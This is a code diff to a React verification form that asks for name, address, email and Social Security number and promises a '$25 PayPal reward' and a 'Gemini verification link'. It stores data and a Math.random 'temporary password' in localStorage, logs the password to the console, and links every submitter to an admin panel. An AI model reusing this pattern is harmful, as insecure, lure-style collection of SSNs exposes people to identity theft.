@@ -1,8 +1,63 @@
 "use client";
 import { useState } from "react";
 import ProgressSteps from "./ProgressSteps";
+import Link from "next/link";
 
 export default function VerificationForm() {
+  const states = [
+    { code: "AL", name: "Alabama" },
+    { code: "AK", name: "Alaska" },
+    { code: "AZ", name: "Arizona" },
+    { code: "AR", name: "Arkansas" },
+    { code: "CA", name: "California" },
+    { code: "CO", name: "Colorado" },
+    { code: "CT", name: "Connecticut" },
+    { code: "DE", name: "Delaware" },
+    { code: "FL", name: "Florida" },
+    { code: "GA", name: "Georgia" },
+    { code: "HI", name: "Hawaii" },
+    { code: "ID", name: "Idaho" },
+    { code: "IL", name: "Illinois" },
+    { code: "IN", name: "Indiana" },
+    { code: "IA", name: "Iowa" },
+    { code: "KS", name: "Kansas" },
+    { code: "KY", name: "Kentucky" },
+    { code: "LA", name: "Louisiana" },
+    { code: "ME", name: "Maine" },
+    { code: "MD", name: "Maryland" },
+    { code: "MA", name: "Massachusetts" },
+    { code: "MI", name: "Michigan" },
+    { code: "MN", name: "Minnesota" },
+    { code: "MS", name: "Mississippi" },
+    { code: "MO", name: "Missouri" },
+    { code: "MT", name: "Montana" },
+    { code: "NE", name: "Nebraska" },
+    { code: "NV", name: "Nevada" },
+    { code: "NH", name: "New Hampshire" },
+    { code: "NJ", name: "New Jersey" },
+    { code: "NM", name: "New Mexico" },
+    { code: "NY", name: "New York" },
+    { code: "NC", name: "North Carolina" },
+    { code: "ND", name: "North Dakota" },
+    { code: "OH", name: "Ohio" },
+    { code: "OK", name: "Oklahoma" },
+    { code: "OR", name: "Oregon" },
+    { code: "PA", name: "Pennsylvania" },
+    { code: "RI", name: "Rhode Island" },
+    { code: "SC", name: "South Carolina" },
+    { code: "SD", name: "South Dakota" },
+    { code: "TN", name: "Tennessee" },
+    { code: "TX", name: "Texas" },
+    { code: "UT", name: "Utah" },
+    { code: "VT", name: "Vermont" },
+    { code: "VA", name: "Virginia" },
+    { code: "WA", name: "Washington" },
+    { code: "WV", name: "West Virginia" },
+    { code: "WI", name: "Wisconsin" },
+    { code: "WY", name: "Wyoming" },
+  ];
+
+  const [randomPassword, setRandomPassword] = useState("");
   const [step, setStep] = useState(1);
   const [formData, setFormData] = useState({
     firstName: "",
@@ -12,6 +67,7 @@ export default function VerificationForm() {
     city: "",
     state: "",
     zip: "",
+    email: "",
     ssn: "",
   });
 
@@ -26,16 +82,35 @@ export default function VerificationForm() {
     city: string;
     state: string;
     zip: string;
+    email: string;
     ssn: string;
   }
 
   const handleSubmit = async (
     e: React.FormEvent<HTMLFormElement>
   ): Promise<void> => {
-    e.preventDefault();
-    // Simulate API call
-    await new Promise<void>((resolve) => setTimeout(resolve, 1500));
-    nextStep();
+    const submission = {
+      ...formData,
+      id: Date.now().toString(),
+      status: "pending",
+      createdAt: new Date().toISOString(),
+      // Mask SSN for storage
+      ssn: `••••-•••-${formData.ssn.slice(-4)}`,
+    };
+
+    // Save to localStorage
+    localStorage.setItem("verificationSubmissions", JSON.stringify(submission));
+
+    // Move to confirmation step
+    const randomPassword1 = ` G3m1n!-${Math.random()
+      .toString(36)
+      .slice(2, 10)}`;
+    localStorage.setItem("email", formData.email);
+    localStorage.setItem("password", randomPassword1);
+    setRandomPassword(randomPassword1);
+    console.log(randomPassword);
+
+    setStep(4);
   };
 
   const renderStep = () => {
@@ -162,10 +237,11 @@ export default function VerificationForm() {
                   required
                 >
                   <option value="">Select State</option>
-                  <option value="CA">California</option>
-                  <option value="NY">New York</option>
-                  <option value="TX">Texas</option>
-                  {/* Add more states as needed */}
+                  {states.map((state) => (
+                    <option key={state.code} value={state.code}>
+                      {state.name}
+                    </option>
+                  ))}
                 </select>
               </div>
             </div>
@@ -203,6 +279,18 @@ export default function VerificationForm() {
             </div>
             <div>
               <label className="block text-sm font-medium text-gray-700 mb-1">
+                Email
+              </label>
+              <input
+                type="email"
+                value={formData.email}
+                onChange={(e) =>
+                  setFormData({ ...formData, email: e.target.value })
+                }
+                className="w-full px-4 py-3 outline-0 text-gray-400 rounded-lg border border-gray-200 focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all"
+                required
+              />
+              <label className="block text-sm font-medium text-gray-700 mb-1">
                 Social Security Number
               </label>
               <input
@@ -234,34 +322,108 @@ export default function VerificationForm() {
         );
       case 4:
         return (
-          <div className="text-center py-8">
-            <div className="mx-auto flex items-center justify-center h-16 w-16 rounded-full bg-green-100 mb-4">
+          <div className="space-y-6">
+            <div className="text-center px-16">
+              <div className="mx-auto flex items-center justify-center h-16 w-16 rounded-full bg-green-100 mb-4">
+                <svg
+                  className="h-8 w-8 text-green-600"
+                  fill="none"
+                  stroke="currentColor"
+                  viewBox="0 0 24 24"
+                >
+                  <path
+                    strokeLinecap="round"
+                    strokeLinejoin="round"
+                    strokeWidth={2}
+                    d="M5 13l4 4L19 7"
+                  />
+                </svg>
+              </div>
+              <h2 className="text-2xl font-bold text-gray-900">
+                Thank you for your submission!
+              </h2>
+              <p className="text-gray-600 mt-2">
+                Your information has been submitted successfully. Your Gemini
+                verification link will be sent to your email shortly. Please
+                check your inbox as well as your spam or junk folder.
+              </p>
+            </div>
+
+            <div className="bg-blue-50 rounded-lg p-6 space-y-4">
+              <h3 className="font-medium text-gray-900">
+                Your Temporary Password
+              </h3>
+              <div className="flex items-center justify-between bg-white p-3 rounded-md border border-gray-200">
+                <code className="font-mono text-gray-800">
+                  {randomPassword}
+                </code>
+                <button
+                  onClick={() => {
+                    console.log(randomPassword);
+
+                    navigator.clipboard.writeText(randomPassword);
+                    alert("Password copied to clipboard!");
+                  }}
+                  className="text-blue-600 hover:text-blue-800 flex items-center"
+                >
+                  <svg
+                    className="w-5 h-5 mr-1"
+                    fill="none"
+                    stroke="currentColor"
+                    viewBox="0 0 24 24"
+                  >
+                    <path
+                      strokeLinecap="round"
+                      strokeLinejoin="round"
+                      strokeWidth={2}
+                      d="M8 5H6a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2v-1M8 5a2 2 0 002 2h2a2 2 0 002-2M8 5a2 2 0 012-2h2a2 2 0 012 2m0 0h2a2 2 0 012 2v3m2 4H10m0 0l3-3m-3 3l3 3"
+                    />
+                  </svg>
+                  Copy
+                </button>
+              </div>
+              <p className="text-sm text-gray-600">
+                Use this password for accessing admin panel.
+              </p>
+            </div>
+
+            <div className="bg-purple-50 rounded-lg p-6 text-center">
+              <p className="text-purple-800 font-medium">
+                Once your identity is verified, you will receive the{" "}
+                <span className="font-bold">
+                  $25 Tremendous PayPal reward link
+                </span>
+                !
+              </p>
+            </div>
+
+            {/* Admin page navigate btn */}
+            <Link
+              href="/admin"
+              className="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium py-3 px-6 rounded-lg text-center transition-colors flex items-center justify-center gap-2"
+            >
               <svg
-                className="h-8 w-8 text-green-600"
+                xmlns="http://www.w3.org/2000/svg"
+                className="h-5 w-5"
                 fill="none"
-                stroke="currentColor"
                 viewBox="0 0 24 24"
+                stroke="currentColor"
               >
                 <path
                   strokeLinecap="round"
                   strokeLinejoin="round"
                   strokeWidth={2}
-                  d="M5 13l4 4L19 7"
+                  d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.572 1.065c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z"
+                />
+                <path
+                  strokeLinecap="round"
+                  strokeLinejoin="round"
+                  strokeWidth={2}
+                  d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"
                 />
               </svg>
-            </div>
-            <h2 className="text-2xl font-bold text-gray-900 mb-2">
-              Verification Complete!
-            </h2>
-            <p className="text-gray-600 mb-6">
-              You will receive your Gemini verification link shortly.
-            </p>
-            <div className="bg-blue-50 p-4 rounded-lg">
-              <p className="text-blue-800 font-medium">
-                Verify your identity to claim your{" "}
-                <span className="text-purple-600">$25 PayPal reward</span>!
-              </p>
-            </div>
+              View All Submissions in Admin Panel
+            </Link>
           </div>
         );
       default:
